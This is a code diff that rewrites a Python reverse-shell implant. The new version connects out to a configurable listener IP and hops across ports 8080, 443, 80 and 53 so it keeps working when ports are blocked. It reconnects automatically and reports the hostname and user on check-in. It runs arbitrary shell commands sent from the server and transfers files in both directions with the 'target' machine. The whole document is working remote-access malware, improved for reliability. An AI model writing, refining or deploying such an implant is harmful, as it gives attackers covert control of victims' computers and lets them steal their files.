@@ -1,80 +1,144 @@
 import json
 import os
-import platform
 import socket
 import subprocess
 import time
 import uuid
-def send_data(data):
-    jsondata = json.dumps(data)
-    sock.send(jsondata.encode())
 
-def recv_data():
+# Configuration
+SERVER_IP = 'your.server.ip.here'  # Update to your listener's IP
+PORT_LIST = [8080, 443, 80, 53]    # Port-hopping list for resilience
+BUFFER_SIZE = 8192                # 8KB chunks for memory-safe I/O
+
+def send_data(sock, data):
+    """ Encodes and sends JSON data securely over the socket. """
+    try:
+        jsondata = json.dumps(data)
+        sock.send(jsondata.encode('utf-8'))
+    except (socket.error, Exception):
+        pass
+
+def recv_data(sock):
+    """ Receives and decodes JSON data, handling potential fragmentation. """
     data = ''
     while True:
         try:
-            data = data + sock.recv(1024).decode().rstrip()
+            chunk = sock.recv(BUFFER_SIZE).decode('utf-8')
+            if not chunk:
+                return None
+            data += chunk
             return json.loads(data)
         except ValueError:
+            # Continue if JSON is not yet complete
             continue
+        except (socket.error, Exception):
+            return None
 
-def download_file(file_name):
-    f = open(file_name, 'wb')
-    sock.settimeout(1)
-    chunk = sock.recv(1024)
-    while chunk:
-        f.write(chunk)
-        try:
-            chunk = sock.recv(1024)
-        except socket.timeout as e:
-            break
-    sock.settimeout(None)
-    f.close()
+def download_file(sock, file_name):
+    """ Receives a file from the server in chunks to save RAM. """
+    try:
+        with open(file_name, 'wb') as f:
+            sock.settimeout(2.0)
+            while True:
+                try:
+                    chunk = sock.recv(BUFFER_SIZE)
+                    if not chunk:
+                        break
+                    f.write(chunk)
+                except socket.timeout:
+                    break
+        sock.settimeout(None)
+    except Exception as e:
+        send_data(sock, f"Download error: {str(e)}")
 
-def upload_file(file_name):
-    with open(file_name, 'rb') as f:
-        while True:
-            chunk = f.read(4096) # Read in 4KB blocks
-            if not chunk:
-                break
-            sock.send(chunk)
-def get_hostname():
-    hostname = socket.gethostname()
-    return hostname
+def upload_file(sock, file_name):
+    """ Sends a file to the server using chunked I/O to prevent crashes. """
+    if not os.path.exists(file_name):
+        send_data(sock, "Error: File not found on target.")
+        return
+
+    try:
+        with open(file_name, 'rb') as f:
+            while True:
+                chunk = f.read(BUFFER_SIZE)
+                if not chunk:
+                    break
+                sock.send(chunk)
+        time.sleep(0.2) # Short pause to clear buffer
+    except Exception as e:
+        send_data(sock, f"Upload error: {str(e)}")
+
 def shell(sock):
-    hostname = get_hostname()
-    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
-                for ele in range(0, 8 * 6, 8)][::-1])
-    he = os.environ.get("USER") or os.environ.get("USERNAME")
-    data = f"{hostname},{mac_address},{he}"
-    send_data(data)
+    """ Main command loop logic. """
+    # Check-in sequence
+    hostname = socket.gethostname()
+    user = os.environ.get("USERNAME") or "UnknownUser"
+    send_data(sock, f"Handshake Successful: {hostname} as {user}")
+
     while True:
-        command = recv_data()
+        command = recv_data(sock)
+        if not command or command == 'kill':
+            break
+        
         if command == 'q':
             continue
-        elif command[:6] == 'upload':
-            download_file(command[7:])
-        elif command[:8] == 'download':
-            upload_file(command[9:])
-        elif command == 'kill':
-            sock.close()
-            break
-        elif command == 'cd ..':
-            os.chdir('..')
-            send_data(f"\nCurrent directory changed to: {os.getcwd()}")
+            
+        elif command.startswith('upload '):
+            download_file(sock, command[7:].strip())
+            
+        elif command.startswith('download '):
+            upload_file(sock, command[9:].strip())
+            
         elif command.startswith('cd '):
-            foldername = command[3:]
-            os.chdir(foldername)
-            send_data(f"\nCurrent directory changed to: {os.getcwd()}")
+            try:
+                os.chdir(command[3:].strip())
+                send_data(sock, f"CWD: {os.getcwd()}")
+            except Exception as e:
+                send_data(sock, f"Path Error: {str(e)}")
+                
         else:
-            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            result = proc.stdout.read() + proc.stderr.read()
-            ab = result.decode('utf-8')
-            send_data(ab)
-while True:
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect(('127.0.0.1', 4444)) #change ip and port
-        shell(sock)
-    except Exception as e:
-        time.sleep(2)
+            # Command Execution with CP437 for Windows 11 Compatibility
+            try:
+                proc = subprocess.Popen(
+                    command, 
+                    shell=True, 
+                    stdout=subprocess.PIPE, 
+                    stderr=subprocess.PIPE, 
+                    stdin=subprocess.PIPE
+                )
+                stdout, stderr = proc.communicate()
+                # Use cp437 and 'replace' errors to prevent crash on special characters
+                result = (stdout + stderr).decode('cp437', errors='replace')
+                send_data(sock, result if result else "Done (No Output).")
+            except Exception as e:
+                send_data(sock, f"Shell Error: {str(e)}")
+
+def main():
+    """ 
+    Primary entry point with Port-Hopping and Auto-Reconnection.
+    Ensures the service remains alive even if a port is blocked.
+    """
+    while True:
+        for port in PORT_LIST:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                # 5-second connection attempt per port
+                sock.settimeout(5.0)
+                sock.connect((SERVER_IP, port))
+                sock.settimeout(None) # Reset to blocking for the shell
+                shell(sock)
+            except (socket.error, Exception):
+                # Clean up the failed socket before trying next port
+                sock.close()
+                continue
+            finally:
+                try:
+                    sock.close()
+                except:
+                    pass
+        
+        # If all ports in PORT_LIST fail, wait before retrying the loop
+        time.sleep(20)
+
+if __name__ == "__main__":
+    main()
